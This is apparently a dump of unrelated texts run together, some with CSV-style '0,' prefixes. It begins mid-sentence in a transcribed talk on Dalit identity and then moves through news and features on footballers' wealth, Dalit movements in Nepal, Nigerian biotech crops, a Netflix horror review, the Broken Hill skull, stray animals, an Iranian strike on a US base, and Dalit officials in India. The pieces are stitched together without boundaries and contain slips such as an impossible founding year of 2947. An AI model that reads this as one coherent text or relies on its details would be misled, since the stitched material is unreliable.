dignity become an act of proclaiming one's own Dalitness as opposed to marking out the Brahmin-Savarna? And it's a very simple question. As Raja Dhale said in his video, I am a human being and slavery has been imposed upon me. Untouchability has been imposed upon me. So why am I not – I'm just personally saying – why am I not a human being, but a special version of it? And the ones who are actually sitting on heaps of looted wealth and grotesque power, they have the privilege to be nothing but humans in present progressive discourses. So why did the assertion become an act of self-exotification? Why? And I'm not saying that it is something we are actively doing or that they are not at all responsible for it. They are the ones primarily responsible for creating these molds into which we have to fit. In fact, just to give you a funny anecdote – I don't know if it's real or not, but it's there in a very popular play about Aurangzeb and Sambhaji. So, Sambhaji never bows down in front of Aurangzeb. And Aurangzeb is very frustrated and he knows that Sambhaji is never, ever going to bow down in front of him. So just to make his own heart happy, he commands everyone to lower the height of the gate at the entrance, so that, at least when he is entering into the cabin of Aurangzeb, Sambhaji is going to bow down. Of course, mostly it's a tale only, but the point that I'm trying to make is that this is how the gates have been defined. If you have to enter their spaces, then the gates have been lowered and you have to lower yourself, crouch your humanity, and become a smaller, twisted version of whatever you are so that you fit comfortably into their entire scheme of things. So, why do I have to do that? Gail Omvedt, in her PhD dissertation, says that Ambedkar would refer to himself as a non-Brahmin scholar. So that is the word he uses for himself: non-Brahmin scholar. So, is Babasaheb using the potency of a label to make himself stand apart by calling himself a Dalit scholar, or is he using the power of a label brilliantly to mark out the oppressor – the one who is an actual abnormality, the one who is an aberration in humanity, in this nation's entire blighted history, as well as in this case, the nation’s entire scholarship? Why is that not getting marked out? And like some of my friends, I too had the pressure to sometimes prove on social media back then, how actually real my Dalitness is. And I know now that this is not assertion, because that is different from the mental burden of constantly having to reiterate to one self and others that one is a quintessential Dalit. There is another anecdote. I used to be 22-23 years old. So, at that time I had just posted something on Facebook and my father came to know that I've posted something on Facebook regarding his life. And then he called me and he was so angry and he shouted at me that I have no right to talk about his embarrassing experiences. He has chosen to portray himself as a doctor, a surgeon, but not what I was trying to do. His experiences were something he had told me as a father to his son, and it was not for me to post on social media. So that was his own assertion of his own identity, and I kind of broke the whole thing. That's how it happens. Because if you are a victim of that gaze, you will try to cater to it. Inferiority complex, that's a birthday gift that you will have, if you become a victim of that gaze. That self-exotification, that there is something different in me, isn't something inherently different, isn't there something really, really fundamentally different between me and someone else as a person? I'm not saying in terms of the surroundings and everything else, but intrinsically. As a human being, before anything happens to me, whatever I am at that level, if I try to feel that there is something different than everyone else, then that's the whole crux of Brahmanism, right? Because by saying that there are different categories, someone is born from the mouth, then arms, then the legs, and so on, the distinction that Brahmanism makes is that it is made directly at the birth level. How are we going to get any help by just inverting this? You don't invert anything. No, by inverting you only strengthen what is already there. So that's why if someone is saying that you don't have any merit, the right answer is not to say that inherently we have more merit than you have, it's just that we don't get opportunity. The right response is just to say that no, everyone is born with the same level of intellect, capacity to feel human emotions and everything else, but the inequalities exist because everything else is not the same. The human essence – I do not like using the word soul – the human essence remains the same. I'm not even going to use the word “more-or-less”, it is the same. It is exactly the same. And any twists, any distinctions to try to make it different at this level is going to ensure that this whole system proceeds, and you might not even get to experience this short human life as a human being. That's the real twist of the caste system. In fact, I'd like to quote James Baldwin. James Baldwin says that the only time your life is destroyed is when you accept the definition of a Negro. He's not saying you're destroyed when you're killed. He's not saying you are destroyed when you are shot or when 10 swords go through you. The real destruction of the human essence happens when you think you are not human. And it could be a superior case or an inferior case. So that's why I think if anyone needs help it is the bhudevtas and everyone else who feels that there is a certain kind of special thing that they are born with. Again, getting back to the original argument, I said that there used to be a pressure on the social media. So why was this pressure? Why does this pressure exist to mark out the untouchable – and there is no pressure to mark out the ones who are not ready to touch – as if he's born that way and not made or looked at in that certain sense? Why is there no pressure on the Brahmin-Savarna to speak on his or her regressive heritage before speaking authoritatively on what the problems of every oppressed community are? Because again, they have been given the super privilege. They don't exist as humans, as I argued back then in 2016, they are existing as meta-humans, free from bondage of history and even reality. They don't even have to be answerable for their nepotism, their caste networks, etc. It's just how they are. They are meta-humans. They can be one thing today, the next thing later on. And they can be whatever they need to be in order to be on top in that particular arena. And again, it's important to say that it's not an argument to change some nomenclature in the movement. I'm not saying that let’s not call ourselves Dalit, let’s call ourselves Scheduled Caste, this is what we’re going to print on our banners. It is not that. This is just an argument to reassess how we, as either Dalits or persons belonging to any oppressed communities, how we are being made to look at ourselves and speak about ourselves, because it affects us even in our most personal introspective moments. There is something within us, a crucial part of the identity of being a human, that is being robbed by the very route of our identity assertion, because that route is now being policed and guarded by the Brahmin-Savarna liberals and academia. And before doing anything out there in the field or on paper, we first need to fully claim this robbed humanity or robbed individuality, in our own hearts and our own minds, and then call out the oppressor as being the oppressor. And why do we need to do this again? Because the logical consequence of the era of the Dalit autobiographies, should have been Brahmin-Savarna biographies. I am not saying that I’m against that whole trend. My own uncle wrote a book, four or five years ago, and all of us are angry at him. And imagine the title of the book, such a dramatic title: Mi Ek Asprushya (I, an Untouchable). We literally had a laugh over it and he also had a laugh later on, because we realized that it's useless, because it had a certain context. When Sharankumar Limbale wrote Akkarmashi and when Baluta came, and there was Jevha mi Jaat Chorli Hoti, and Babytai Kamble’s autobiography, I don't need to name all of them, but that era (makes them relevant).. As I said, Brahminism is a system which only believes in superiority and maintenance of the status quo. So, the ideologies can keep changing. They are very flexible. So, they became very accustomed to this whole thing. In fact, as me and Rahul discussed Narhar Kurundkar and Gunwant has also discussed and I’ve also written on it on Round Table India[2]. So, they feel so comfortable to write an article, which was titled, Dalit yanni koshotun baher yaave, which means Dalits should get out of their caves and it gets published on 14th April. So imagine, what gave Kurundkar the power to use that kind of sweeping statements: Dalits do that, Dalits do this. I mean, koi school ka class hai kya ki 10th A ke sare log bahar aake khade ho (is this a school where the headmaster directs all students of section 10th A to go and stand outside). That's the kind of policing that happens because they ensure that we are now all in the same division – 10th A mein sare log baithe hain (all students in 10th A are sitting there) – and you can't be out of that. So, again, as I’d argued in 2016, the logical consequence of the era of Dalit autobiographies should have been the biographies that we write about Brahmin-Savarna. So, biographies should be penned by the people from the oppressed groups, where they will tear down the whole palaces of the shastris and the landlords. In fact, this is how we began. We began by the very exposure of the Brahmanical system, if we consider our beginning as with the writings of Jotiba and Savitrimai Phule. If you consider that as the beginning of the modern era, then this is how it began, with the whole deconstruction. But somewhere along the way that part went missing. And we need to ask ourselves why, because the magnifying glass, which was supposed to be used for scanning the mechanisms of the caste system, was instead flipped and the Dalit, and sometimes the Adivasi became the sole object of its twisting and burning glare. Now we have some ridiculous inhuman studies, comparing fertility rates of a certain tribe with fertility rates of another tribe and so on. And especially, we’re ignoring Babasaheb’s essential insight: he wrote this in an editorial in Janata, in which he says that the base is not the building. And if you want to change the base, then the building that has been constructed on it must be knocked down. So the question that we should pose to ourselves is, why did the base replace the building? Which means that – and this was the title of the Round Table India article – why did Dalit become the mascot for the caste system[3]? That's all it is. It's just a mascot. It has almost become that in the hands of the Brahmin – again, I'm choosing my words very carefully – in the hands of the Brahmin-Savarnas, Dalit has become almost an empty signifier. It has become a general weapon, a general tool, a multipurpose tool. They can use this to pit different bahujans against each other. Now they will try to pit Scheduled Caste A category against Dalit B category. As I said, the moment you give them a cake, they will slice that cake into intersections. I'm not saying that the cake was made by us. I'm just saying that that's how the whole thing was handed to us. But once the cake exists, once it is a thing, once it is a race, then they can make any kind of intersections because you agreed to it, right? If you already agreed to be a Dalit, then what’s the problem in saying that you're a middle-class Dalit or Dalit man and so on? And thus, it becomes a tool. It also becomes a tool not just to define us, but also to define them, which is what Rege did, calling herself and the entire Brahmin community and everyone else as non-Dalit, and ensuring that she's in the same category as Brahmin and Adivasi. Please note the seriousness of this. So, she is closer to Adivasis and all the Dalits are something else, different altogether. So, all the ex-untouchables, you’re something else, but all the non-Dalits, as she calls herself and as all the Brahmin academics might be calling themselves, they are closer with everyone else who is not a Dalit. As I said in the beginning, they are now using this whole pass the mic strategy to purify their own stages, their newspapers, their journals, by including and harping the word Dalit. It has become a kind of a Ganga-Snan where they can skip the whole question of caste system and sprinkle some Dalit swadanusaar (according to taste), and you have a perfect progressive recipe at your table. So, the term Dalit is not going to be used or be useful in the context (of anti-caste assertion), I have observed. What exactly is now the potency of this term? Because the whole point should have been that as a human being, as far as I could stretch my wingspan, I could be anything, an artist, not just in my profession, but just how I look at myself. It would be so diverse. That whole possibility is being extinguished. It's being nipped in the bud because of this imposition of identity. ~ References  [1] https://roundtableindia.co.in/index.php?option=com_content&view=article&id=8181:tilak-the-granddaddy-of-all-hindutvavadis&catid=119:feature&Itemid=132 [2] https://roundtableindia.co.in/index.php?option=com_content&view=article&id=8295:on-brahmin-hegemony-a-short-note&catid=119:feature&Itemid=132 [3] https://roundtableindia.co.in/index.php?option=com_content&view=article&id=9193:gaurav-somwanshi&catid=119:feature&Itemid=132  ~~~  This talk was transcribed by Anand Silodia Gaurav Somwanshi is CEO & Cofounder of EmerTech Innovations Pvt Ltd.

The raking by The Sunday Times, placed Mohammad Salah of Egypt as the richest U-30 African player in the EPL. With a net worth of £114m, Gareth Bale rated as the richest sports star aged 30 and below, followed by Anthony Joshua who is the only non-footballer on the list. Ighalo was estimated to have £18m wealth while Mo Salah has an estimated £19m net worth. On the overall ranking, the Manchester United striker placed joint-15 alongside Aaron Ramsey (Juventus), Danny Welbeck (Watford), and Jack Wilshere (West Ham). The striker is estimated to have a staggering £18m wealth with his substantial £300,000-a-week wage at his parent club Shanghai Shenhua. The PUNCH reports Ighalo is expected to be 31 years old in June, and his loan at United is expected to end on May 31 with the club holding the option to make the deal permanent. According to reports, United is contributing £130,000-a-week towards the former Watford striker’s wages. While awaiting a contract extension at United, the Nigerian player has reportedly been offered a deal worth £400,000-a-week by Shanghai Shenhua.

0,"Home » Heritage » History » History of Dalit movements in Nepal: Much has been achieved, but discrimination still exists Dalits are those communities that have been oppressed, and marginalised in the worst forms for millenniums in the name of caste, the major practice of social stratification in the Hindu society in South Asia. Also termed ‘Achhoots’ (meaning ‘untouchables) by the radical enforcers of the extremely rigid caste system, the Dalits are not included even in the traditional four Varnas and are referred to as ‘Panchamas’. In an orientalist historical explanations, untouchability originated when Indo-Aryan community migrated to the Indian subcontinent in around 1,500 BCE and deemed the indigenous community inferior in terms of cultural and racial aspects. Manusmriti, an ancient Hindu legal text written around 1,250-1,000 BCE, incorporated the caste system as the basis of order and regularity ‘to preserve the purity of race and blood, ostracising the indigenous community into Achhoots. India’s BR Ambedkar, however, declines to accept this multiracial notion of Aryans and non-Aryans and the purity. He defines caste as an artificial stratification of people into fixed and definite units. He presents the caste system not as a racial division but as a social division of people of the same race. In Nepal, the earliest caste system is said to have come to practice in Khas Rajya (modern-day western Nepal) in the 12th century when Brahmins from the then independent states in India came to the Sinja valley. Dor Bahadur Bista’s Fatalism and Development details how the caste system was introduced in Khas Rajya during the early medieval period. Likewise, the caste system was introduced in Kathmandu Valley by King Jayasthiti Malla with the assistance of his five pandits in the 14th century by introducing four Varnas and 64 Jaats. In modern times, Prithvi Narayan Shah declared his unified territory as the country of four Varnas and 36 Jaats. Jung Bahadur Rana legitimised the caste system through the country’s first documented law, Muluki Ain (Civil Code) 1854, and also included non-Hindu groups in the caste system. The legal code documented the castes into four types: The root of the word ‘Dalit’ is ‘Dalan’, which translates to oppression in Sanskrit, Nepali and Hindi languages. Hence, ‘Dalit’ means ‘oppressed’. Perhaps, the word was first used by the Indian reformer Jyotirao Phule. Although Mahatma Gandhi proposed and used the term ‘Harijan’ or ‘children of god’ in 1932, Ambedkar used and popularized the word ‘Dalit’ as a quasi-class term, referring to a class of people at the rock-bottom of the Hindu caste hierarchy. Whether one believes the colonial orientalist view or the countering view of Ambedkar, it is undeniable that the Dalits have been ostracised and oppressed for more than three millenniums since the Vedic age. When the caste system was introduced in Khas Rajya, it created a hierarchical and social difference among the people of the state. Similarly, while many historians see the division of the caste system based on people’s occupation as a reform, it also led to segregation and oppression. For example, people from the lowest caste in the Kathmandu valley in the medieval period were not allowed to have tiles on their roofs and had to show respect to the people of the higher caste. Practising the caste system inflicted discrimination so much so that it would deny even the basic rights to the people from the lowest castes. Jung Bahadur Rana encouraged discrimination based on castes through the Muluki Ain, which was already in practice in the Nepali society. The punishments were set based on caste as the Brahmins were not given capital punishments while the people from the lowest castes would get severe ones. Similarly, marriage was made endogamic, i.e., within the same caste for the sake of purity. The people labelled as impure were denied even the basic social, economic, cultural, intellectual, and political rights. They were not allowed to touch tap water used by people of a higher caste, could not enter temples, would be punished if they married from a higher caste. They had no participation in politics and education and were even prohibited to touch people and their belongings. The history of Dalit movements in Nepal can be traced parallel to the country’s political history. The first wave of Dalit assertion in Nepal began in 1947 in a village called Thadaswara in Baglung district when Sarvajit Bishwakarma established an organisation called Vishwa Sarvajan Sangh to challenge the existing caste system and wore a ‘janai’ (the sacred thread) against the oppression. In the Kathmandu valley, the successful movement of the Pashupati Temple Entrance Campaign in 1954 is considered one of the first movements. Many other organisations such as Tailor’s Union (1947), Nepal Samaj Sudhar Sangh (2947), Nepal Harijan Sangh (1947) were established before the democratic struggle against the Rana regime in 1951, while many other organisations were established for Dalit movements and upliftment during Nepal’s first tenure of democracy in 1950-60. The Interim Government of Nepal Act (1951) was the first legal document to recognise people, including Dalits, as ‘citizens’ with civil and political rights. The autocratic Panchayat regime formulated the New Muluki Ain in 1963 and tried to abolish untouchability in the legal and social systems. During the Panchayat era, nine more organisations were established for the upliftment of Dalits. As the country adopted the free market policy after the restoration of democracy in 1990, it also sought to provide welfare through private development partners such as national and international non-government organisations (I/NGOs). Many organisations emerged with slogans of Dalit emancipation. As the Dalit movement rose, the government formed the Dalit Commission in 2002 and brought many programmes such as scholarships and reservations. And, although such steps were not adequate to abolish caste-based discrimination, it certainly boosted the morale of Dalit rights activism. Dalits had an important role during the decade-long Maoist Insurgency (1996-2006) as thousands of Dalit men and women participated in the armed conflict while around 200 were killed.  The country headed to a more participatory federal system post the second People’s Movement in 2006. The issues of Dalits have been covered on the national agenda and the Dalit movement has gradually progressed although it is yet to be institutionalised. The major achievement during the last decade has been the criminalisation of caste-based discrimination through the Caste-based Discrimination and Untouchability Crime Elimination and Punishment Act in 2011, and the Constitution of Nepal (2015) endorsing the rights and opportunities for the Dalits for their upliftment. Moreover, the constitution recognised the National Dalit Commission as a constitutional body, and the National Dalit Commission Act 2017 was enacted to ensure opportunities for Dalits. Similarly, the Nepali Parliament has reserved certain seats for Dalits and other excluded communities in the proportional representation system to ensure participation in the political spheres. As per the election laws, 13.8% of the PR seats in the House of Representatives, as well as the provincial assemblies, are allocated for Dalits while the seven provinces must select at least one Dalit representative each among eight seats allocated to them for the National Assembly. Moreover, at least one woman between two women members in each ward of a local government must be from the Dalit community to ensure participation. The discrimination against Dalits is still a prevailing issue in Nepal as reports of discrimination, prejudice and even hate crimes emerge from time to time. In recent times, the news broke out about the killing of six people from the Dalit community in Rukum (West) as one of the victim tried to elope with a girl from a higher caste. The devastating news did not only shake the nation but brought out again the discourse on discrimination and oppression on the Dalits.

It comes as an important corrective after decades of celebrating the, quote, “discovery” of the Americas by Christopher Columbus each year. We know, of course, that no such discovery happened — what did happen was colonization and centuries of subjugation, murder, disenfranchisement and displacement of Native Americans. As we reflect on our history and on the stories that have been too often excluded, we consider the importance of not just what stories get told, but of who gets to tell them.

0,"The National Biotechnology Development Agency, NABDA, says Nigeria will be happy to transfer its technology behind bio-tech (bt) cotton, bt cowpea and others to other African countries to help boost agricultural productivity. Prof. Alex Akpa, the Director-General (DG) of NABDA, said this on Wednesday in Abuja during a courtesy visit by Commonwealth Students/Youth Federation for Peace. Mr Akpa said it was very important that Nigeria should extend this technology to other African countries “and I assure you that we will be happy to do that.’’ The DG disclosed that the variety of bt cotton developed in Nigeria is between 4.2 to 4.5 tonnes per hectare. “In fact somebody who is a very enlightened farmer got 5 tonnes per hectare and reported that during the last field day in the agency; so you can imagine the dramatic increase. “The traditional variety gives you between 250 to 750 kilogram per hectare, that is less than one ton per hectare, so you can see the type of thing science can do,’’ he said. He told the visitors that NABDA had “also done bt cowpea’’, and that Nigeria is the first country in the world to develop bt cowpea, an important protein source for low income earners. He disclosed that cowpea (beans) was naturally prone to insect pest attacks, not only in the store but also in the field. “In the field there is a devastating pest called maruca which can eat up a 10 hectare farm in 10 days, which is a nightmare to farmers,’’ the DG said. Mr Akpa further disclosed that the bt cowpea developed in Nigeria was resistant to the insect pest, maruca. He said not only that, tiny weevils also tend to eat them up during storage, converting them to dust. He added that out of desperation, business people and even some farmers had tried to preserve beans in the store by using “sniper, a very dangerous chemical’’. READ ALSO: Fighting financial fraud, cybercrime requires synergy – NITDA Mr Akpa said although sniper was an effective pesticide, “but very dangerous, it kills humans’’. He said the good news was that “we do bio-fertilizer, bio-insecticide and also bio-fungicide.’’ According to him, the bio-insecticide is effective in preserving beans in storage by destroying the tiny weevils that destroy these produce in storage. He hinted that the bio-insecticide was “totally harmless to the environment and completely harmless to humans because they are normal micro organisms.’’ The NABDA boss also spoke on what the agency had done on yam seedlings and what they were planning to do this 2020. He expressed appreciation over the visit of the youth federation, saying he was honoured for making him their patron. Earlier, Kewul Suleh, from Ghana and president of the federation said he spoke on behalf of the entire officials serving in the 2018/2022 leadership of the federation. Mr Suleh extolled the virtues of the DG and steadfastness on his firm principles. The visitors also extended an invitation to the DG on their upcoming World Youth Summit to be held in Accra, Ghana.

0,"Review: With films like '8', it appears the South African film industry may be ripe for a folk-horror renaissance. The recurring words spoken in Harold Holscher's new Netflix horror 8 are ''moths'' and ''worms.'' These things are weaved into the film's horror infrastructure, not necessarily as elements to gross out viewers, but as allegories about death and transfiguration. Coming off the back of previous shorts that embrace dark themes, 8 arrives on Netflix as Holscher's full-length feature debut following its film festival run. The South African writer-director goes for high impact, pushing this South African folkloric chiller into the creepiest, darkest places. Whether or not 8 succeeds in doing this is a question that might annoy horror die-hards looking for more inventive scares. Establishing atmosphere and tone right away, the opening frame shows a sickly, pale-faced elderly man lying in bed, he then reclines into his death when a mysterious man and his evil spawn of a companion come to take his soul. Considering this happens in broad daylight, the scare is rather effective. Holscher, using low camera angles to reveal the intruder, casts him as nothing more than a dark, faceless silhouette—a shot that highlights the director's technical dexterity.  What happens after this is a new beginning: William (Garth Breytenbach) and his wife Sarah (Inge Beckmann), along with their adopted daughter Mary (Keita Luna) arrive at a farmhouse which belonged to his just-deceased father in 1977. The family's arrival carries tonal echoes of pre-existing horror productions where houses are haunted (Poltergeist, The Conjuring) and others which eventually spiral into disintegration and domestic decay (The Shining, Pet Sematary). We are keenly aware that Williams happens not to be suspicious of his father's death.  His wife Sarah, all aristocratic steel and high jaw, on the other hand feels something isn't right about Lazarus (Tshamano Sebe), the stray-looking man who has befriended their daughter out of nowhere. Lazarus is baked in dirt, hair riotously shaggy, body screaming for a bath. But he's no ordinary man. He's a sangoma in a pact with a demon called Uthuli, reincarnating with the body of his dead daughter and lords over Lazarus to deliver souls to him. The creature design is remarkable – talons, sharp teeth, crooked back – and matches the sheer, asymmetrical grotesqueness of Guillermo del Toro's monsters. Mary, who's on the cusp of adolescence, is caustically articulate and maintains a morbid interest in the supernatural. Maybe that's why she and Lazarus are drawn to each other, weaving around themselves creepy fantasies of pet silkworm burials and pinkie friendship pledges. More importantly, they find in each other the phantoms of people they have lost. For Mary, it's her parents. For Lazarus, it's his family, his daughter dying in a fire after his wife died during childbirth. At William's request, Lazarus is sheltered in the yard. Sweet and soft-spoken, William tries to check all the boxes of a good husband. Here, in their new bucolic environment teeming with trees and winding foliage, William is carved into shapes of handy, sweaty physical masculinity: bulb fixing, wood chopping, generator servicing. All the while, Sarah's paranoia about Lazarus heightens. 8 | Official Trailer | Netflix www.youtube.com 8 utilises horror to examine human nature and the complicit participation of our destruction. Are we who we say we are? Can we confront our own inner demons? While the film's piece-by-piece exposition sums the motives of its characters nicely, never once overwhelming the viewer, the plot does run into pockets of inertia with its severely slow pacing. The characters, especially Mary, spends too much time drifting around the yard, and without any payoff. Sarah mostly hides herself away in the sombre cavity of the house, letting her disapproval of Mary's association with Lazarus swallow her whole. When she speaks, her sentences are clipped and often roll out as an order. With William around, their marriage doesn't seem to have a nourishing, emotional core, almost flattened by larger plot influences. The plot itself doesn't unravel any kind of strains in their relationship or festering resentment, only that Sarah can't have a child of her own. The film's trailer had a strong, visceral imagery with high emotional stakes, but juxtaposing it against the full duration, the horror beats feel muted and under-developed. On other accounts, 8 is carried by the drawn-out tics of Tshamano's acting, who shifts from bloodless, demon-controlled killer to guilt-ridden pariah. The final moments where Uthuli comes for Mary's lily-white innocence might be borderline absurd, it serves bits of South African witchcraft and the existential riff between good and evil. Circling back to the year again, 1977, Holscher supplants his horror picture in a South Africa still steeped in apartheid, where its black and white characters maintain skeletal interactions poisoned with extreme caution. Through this framing of time, Holscher smuggles in ugly nostalgia and perhaps drawing our attention to how modern South Africa still retain strains of segregation. South African horror cinema has turned a corner since 1989's seemingly low-budget Hellgate—now with more texture and sophistication as seen in postmodern offerings like The House on Willow Street (2016) and Rage (2020), Showmax's first Original horror movie. The tonal similarity between The Tokoloshe (2018) and 8 is perhaps a signal that South Africa's film industry is ripe for a folk-horror renaissance, and the world might just be ready too."

An enigmatic African hominid fossil known as the Broken Hill skull dates to around 300,000 years ago, about the time that Homo sapiens started evolving across that continent, researchers say. The Natural History Museum/Alamy Stock Photo By Bruce Bower April 1, 2020 at 11:00 am A mysterious but well-preserved hominid skull found nearly a century ago comes from a population that lived in Africa around 300,000 years ago, as the earliest Homo sapiens were evolving, a new study finds. This discovery indicates that a separate Homo population, perhaps a species some researchers call H. heidelbergensis (SN: 6/22/19), inhabited Africa at the same time as both H. sapiens and a recently discovered population dubbed H. naledi (SN: 6/10/17), say geochronologist Rainer Grün and his colleagues. African H. heidelbergensis could have been a recently reported “ghost population” (SN: 3/14/20) that interbred with ancient H. sapiens and passed a small amount of DNA to present-day West Africans, the researchers suggest April 1 in Nature. “We can now identify at least three distinct and contemporary [Homo] lineages in Africa about 300,000 years ago, but we don’t yet know whether our ancestry was largely or entirely contained within the H. sapiens part of that variation,” says paleoanthropologist and study coauthor Chris Stringer of the Natural History Museum in London. Researchers have puzzled over the age of the Broken Hill skull since its 1921 discovery in south-central Africa. Metal ore mining at what was then Northern Rhodesia’s Broken Hill mine revealed deposits bearing the skull and two associated leg fossils. The site, located in what’s now known as Zambia, has been named Kabwe. Previous age estimates for the fossils, based on clues such rodent fossils and stone tools found at the site, have ranged widely from around 500,000 to 125,000 years old. Headlines and summaries of the latest Science News articles, delivered to your inbox Thank you for signing up! There was a problem signing you up. Because quarrying destroyed the site, sediment that may have yielded fossils can’t be dated. Instead, Grün, of Griffith University in Nathan, Australia, and his team dated small samples of bone and teeth from the Broken Hill skull using measures of the radioactive decay of uranium and the accumulation of natural radioactivity from sediment and cosmic rays. Based on these techniques, the team estimates the skull’s age at between 324,000 and 276,000 years old. Double-edged stone implements typically found at ancient H. sapiens sites were also recovered near the Broken Hill skull, suggesting that H. heidelbergensis made the same type of tools, the scientists say. It’s unclear if H. heidelbergensis fashioned those artifacts, which also can’t be definitively linked to the Broken Hill skull, counters archaeologist Eleanor Scerri of the Max Planck Institute for the Science of Human History in Jena, Germany. But a “seemingly reliable age of approximately 300,000 years” for H. heidelbergensis in Africa fits a scenario in which H. sapiens began evolving across Africa (SN: 12/21/19) around that time , Scerri says. In that scenario, mating occurred among dispersed human populations with various skeletal traits, as did occasional interbreeding with other Homo species. “It wouldn’t be surprising if there was some gene flow between the lineage leading to us and H. heidelbergensis,” she says. African Homo fossils from around 300,000 years ago (SN: 7/8/17), including the Broken Hill skull, are either direct ancestors or close relatives of H. sapiens, says paleoanthropologist María Martinón-Torres of the National Research Center on Human Evolution in Burgos, Spain. But H. heidelbergensis has become a confusing species designation, comprising a diverse group of partial hominid fossils that can’t easily be compared to one another, she contends. Populations in many parts of Africa may have mixed and mingled to produce H. sapiens, “but at this point the picture is still blurred,” Martinón-Torres says. Questions or comments on this article?

In 2011, IOL reported that there were over 230 000 stray dogs in Cape Town alone! These animals (both cats and dogs) usually rely on humans to survive, whether that be through various feeding schemes or scraps left in the garbage. Removing the human element over the lockdown would cause these strays to suffer as well. But one South African shared an inspiring idea that might help these forgotten and abandoned animals. Nadia Singh shared a post to her Twitter and although the photos don’t seem to be from South Africa, it is still an inspirational idea to look after abandoned animals during lockdown! “We are in quarantine but this was the most beautiful thing I saw today, and it deserves to be shared.” In the photos, plastic bottles have been repurposed for food and water bowls for strays. It is a simple idea but shows true kindness. “The greatness of a nation can be judged by the way its animals are treated” – Mahatma Gandhi  Brent Lindeque is the founder and editor in charge at Good Things Guy.

(Photo: FOX News) Eleven U.S. service members were flown out of Al Assad Air Base in Iraq and treated for concussion symptoms after Iran's rocket attack targeting two Iraqi military bases earlier this month, a spokesman for U.S. Central Command revealed Thursday night. President Trump and U.S. officials had said earlier that no Americans were killed or injured in the Jan. 8 attack. Several U.S. troops ""were treated for concussion symptoms from the blast and are still being assessed. As a standard procedure, all personnel in the vicinity of a blast are screened for traumatic brain injury, and if deemed appropriate are transported to a higher level of care,"" Capt. Bill Urban, the Central Command spokesman, said Thursday. AERIAL IMAGES OF IRANIAN ATTACK ON IRAQ BASE He said that although no U.S. service members were killed in the attack on Al Assad Air Base, ""in the days following the attack, out of an abundance of caution, some service members were transported... to Landstuhl Regional Medical Center in Germany, others were sent to Camp Arifjan, Kuwait, for follow-on screening. When deemed fit for duty, the service members are expected to return to Iraq following screening. The health and welfare of our personnel is a top priority and we will not discuss any individual's medical status. At this time, eight individuals have been transported to Landstuhl, and three have been transported to Camp Arifjan."" The explosions at the base, about 110 miles west of Baghdad, created large craters, knocked over concrete barriers and destroyed facilities that house dozens of soldiers. The attack on the Al Assad base, where about 1,500 American and coalition forces are stationed, was carried out in retaliation for the killing of Iranian Revolutionary Guards Gen. Qassem Soleimani. Iraq claimed its sovereignty had been violated by the killing, and took swift action in calling for all U.S. armed forces to leave the country. U.S. forces had first used the base after the 2003 U.S.-led invasion that toppled Iraqi dictator Saddam Hussein. It later saw American troops stationed there amid the fight against the Islamic State terror network. Trump visited the sprawling airbase in December 2018, making his first presidential visit to troops in the region. Advertisement Fox News’ Jennifer Griffin contributed to this report.

0,"The government school in Tiruvallur where the Independence Day event was held. In another instance of caste-based discrimination, a Dalit panchayat president in a village of Tamil Nadu's Tiruvallur district has claimed she was not allowed to hoist the national flag on Independence Day. V Amurtham, the 60-year-old panchayat chief of Athupakkam village, about 45 km from state capital Chennai, said she was invited to hoist the flag at a government school. However, she was later asked not to come citing Covid-19 concerns. The panchayat chief's son, Sasikumar, said his mother received the call inviting her to the school for flag hoisting at 8:30pm, but was asked half an hour later to not come. He added that the Independence Day event was held without her the next day, despite the apparent health concerns. Amurtham claimed that the former panchayat chief still held sway over community affairs and that she has been at the receiving end of discrimination and threats. ""My mother is wondering if she should give up the responsibility,"" said Sasikumar. Aurtham told reporters that she needs protection as she feels threatened because she belongs to the SC/ST community. This was the second such incident for the panchayat chief. In January, Amurtham was turned away from hoisting the tricolour in the school. When contacted, district authorities said they have not received any formal complaint. Meanwhile, the State Human Rights Commission has sought a report from the district collector."
0,"Kolkata: Chief Minister Mamata Banerjee on Thursday handed over a grant of Rs 5 crore each to Dalit Sahitya Academy and West Bengal Hindi Academy for spreading of Dalit and Hindi literature. She also initiated distribution of monthly pension and house building grants to about 8,000 Sanatan Brahmin priests in the state. Before addressing the Durga Puja Co-ordination meeting at Netaji Indoor Stadium on Thursday the Chief Minister initiated the distribution by handing over the benefits to some of the Sanatan Brahmin priests. The pension of two months, that is Rs 2,000 for the months of September and October, has been given out together. At the same time they have received Rs 1.20 lakh as a grant to build houses. It was on September 14 when the Chief Minister had announced giving the monthly allowance and free housing and free housing to the Sanatan Brahmin priests. She had then said: ""Many priests from the Sanatan Brahmin sect in Bengal are financially weak. The state has decided to help them by providing a monthly allowance of Rs 1,000 and free homes under its housing scheme."" The state government also provided land to the Sanatan Brahmin sect to set up an academy at Kolaghat. The Chief Minister handed over a certificate of recognition to Dalit littereateur Manoranjan Byapari, who has been made the chairman of the Dalit Sahitya Academy, and former MP Vivek Gupta, head of the West Bengal Hindi Academy, following announcement of the Rs 5 crore grant to each of the academies. On September 14, that is on the day of Hindi Diwas, Chief Minister had announced of setting up of the Dalit Sahitya Academy and restructuring of West Bengal Hindi Academy. The step to set up the Dalit Sahitya Academy was taken considering that lakhs of people from the community stay in Bengal and the academy will be representation of people from communities including Namasudra, Matua, Baghdi, Bauri, Dom and Majhi with principal objective of making people aware of the challenges faced by the Dalit and refugees for centuries and also to act as a centre to study the same besides publishing the complete works of Dalit scholars. Similarly, the West Bengal Hindi Academy has been restructured with 25 members with an aim to increase its scope of work. The step has been taken as Bengal loves and respects all languages and the Mamata Banerjee government has given recognition to languages including Hindi, Urdu, Ol Chiki, Gurmukhi, Kuruk, Rajbanshi and Gurmukhi. © Copyrights 2020.

